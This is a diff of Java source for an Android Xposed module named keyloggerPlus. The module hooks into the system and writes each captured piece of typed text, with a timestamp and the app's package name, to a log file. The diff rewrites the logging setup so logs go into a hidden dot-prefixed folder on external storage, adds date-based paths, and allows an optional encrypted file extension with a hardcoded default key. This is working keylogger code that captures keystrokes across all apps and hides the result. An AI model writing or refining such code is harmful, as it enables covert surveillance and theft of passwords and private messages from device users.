@@ -1,6 +1,7 @@
 package com.sscsps.keyloggerPlus;
 
 import java.io.BufferedWriter;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
@@ -103,31 +104,30 @@ public class Hook implements IXposedHookZygoteInit {
 			return;
 
 		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
-//		if (mWriter == null)
-//			try {
-//				String ext = ".log";
-//				if(mXsp.getBoolean(mEncrypt, false)){
-//					ext = "." + mXsp.getString(mEncryptKey, "6677667766776677") + ".xlog";
-//				}
-//				if(!mXsp.getBoolean(mUseDate, true))
-//					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs/logs" + ext);
-//				else{
-//					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs") +
-//							"/20" + currentDateTimeString.substring(6,7) + "/" +
-//							currentDateTimeString.substring(3,4) + "/" + currentDateTimeString.substring(0,1) + ext ;
-//				}
-//				mWriter = new BufferedWriter(new FileWriter(filePath, true));
-//
-//			} catch (IOException e1) {
-//				XposedBridge.log("Path is not initialized...");
-//				return;
-//			}
 		if (mWriter == null)
-			try {
-				mWriter = new BufferedWriter(new FileWriter((Environment.getExternalStorageDirectory() + (mXsp.getString(mLogPath, "KeyLogs/log.txt"))), true));
-			} catch (IOException e1) {
-				return;
-			}
+			 try{
+				 String ext = ".log";
+				 if(mXsp.getBoolean(mEncrypt, false)){
+					 ext = "." + mXsp.getString(mEncryptKey, "6677667766776677") + ".xlog";
+				 }
+				 if(!mXsp.getBoolean(mUseDate, true))
+					 filePath = Environment.getExternalStorageDirectory() + File.separator + "." + mXsp.getString(mLogPath, "KeyLoggerPlus/logs" + ext);
+				 else{
+					 filePath = Environment.getExternalStorageDirectory() + File.separator + "." + mXsp.getString(mLogPath, "KeyLoggerPlus") +
+							 File.separator + "20" + currentDateTimeString.substring(6,8) + File.separator +
+							 currentDateTimeString.substring(3,5) + File.separator + currentDateTimeString.substring(0,2) + ext ;
+				 }
+				 File logfile = new File(filePath);
+				 if (!logfile.exists()) {
+					 logfile.mkdirs();
+					 logfile.delete();
+				 	 logfile.createNewFile();
+			 	 }
+				 mWriter = new BufferedWriter(new FileWriter(logfile, true));
+
+			 }catch(IOException ioe){
+				 XposedBridge.log(ioe);
+			 }
 
 		XposedBridge.log("path: " + filePath);
 		String logLine = currentDateTimeString + ">" + packageName + ">" + text;
